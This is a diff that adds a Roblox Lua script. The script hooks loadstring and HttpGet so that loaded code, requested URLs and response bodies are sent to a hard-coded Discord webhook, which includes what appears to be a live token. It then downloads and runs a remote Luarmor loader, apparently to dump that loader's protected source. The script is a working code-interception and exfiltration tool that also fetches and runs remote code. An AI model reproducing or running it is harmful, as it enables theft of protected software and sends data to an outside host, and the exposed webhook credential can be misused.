@@ -1,0 +1,38 @@
+loadstring([[
+local H=game:GetService("HttpService")
+local W="https://discord.com/api/webhooks/1518937462083424316/WJi4kfdiYXec4XghwYhIfqHvnSNP5deGj-t992Cuk3iEl9N-QtuOD-y6B7OyeGKdwCpT"
+
+local function S(m)
+    pcall(function()
+        local d={Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({content=m})}
+        if syn and syn.request then syn.request(d)
+        elseif http and http.request then http.request(d)
+        else request(d) end
+    end)
+end
+
+S("START")
+
+local old=loadstring
+loadstring=function(c,n)
+    S("LS: "..tostring(n).." size:"..#c)
+    if #c>50 then S(c:sub(1,1900)) end
+    return old(c,n)
+end
+
+local og=game.HttpGet
+game.HttpGet=function(s,u,...)
+    S("GET: "..u)
+    local r=og(s,u,...)
+    if #r>50 then S("RESP: "..r:sub(1,1900)) end
+    return r
+end
+
+S("LOADING...")
+local loader=game:HttpGet("https://api.luarmor.net/files/v4/loaders/d69f617d5177f0dd59232b8b05640600.lua")
+S("SIZE:"..#loader)
+local f=loadstring(loader)
+if f then S("RUN") f() S("DONE") else S("FAIL") end
+wait(3)
+S("END")
+]])()
